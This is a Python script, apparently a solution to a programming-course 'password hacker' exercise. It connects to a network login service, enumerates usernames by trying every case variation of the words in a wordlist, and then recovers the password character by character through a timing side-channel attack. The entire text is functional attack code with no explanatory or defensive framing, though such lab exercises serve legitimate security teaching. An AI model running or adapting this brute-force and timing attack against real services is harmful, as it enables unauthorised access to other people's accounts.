# write your code here
import json
import sys
import socket
import itertools
import string
from datetime import datetime


class Hack:

    def __init__(self, address):
        self.address = address
        self.login_password = {"login": "", "password": " "}
        self.admin_generator = self.admin()
        self.password_generator = self.password()

        self.letters_digits = string.ascii_letters + string.digits
        self.login_file = "logins.txt"

    def password(self):
        while True:
            for msg in self.letters_digits:
                yield "".join(msg)

    def admin(self):
        with open(self.login_file, "r") as file:
            all_words = file.read().split("\n")
            for word in all_words:
                for variation in list(map("".join, itertools.product(*zip(word.upper(), word.lower())))):
                    yield variation

    def find_login(self):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)

            while True:
                self.login_password["login"] = next(self.admin_generator)
                json_login_password = json.dumps(self.login_password)

                client_socket.send(json_login_password.encode())

                response = json.loads(client_socket.recv(1024))
                if response["result"] == "Wrong password!":
                    break

            found_password = ""
            while True:
                attempt_password = next(self.password_generator)
                self.login_password["password"] = found_password + attempt_password
                json_login_password = json.dumps(self.login_password)

                client_socket.send(json_login_password.encode())
                start = datetime.now()
                response = json.loads(client_socket.recv(1024))
                end = datetime.now()
                difference = (end - start).total_seconds()

                if difference >= 0.1:
                    found_password += attempt_password[0]
                if response["result"] == "Connection success!":
                    break


args = sys.argv

hacker = Hack((args[1], int(args[2])))
hacker.find_login()
print(json.dumps(hacker.login_password))
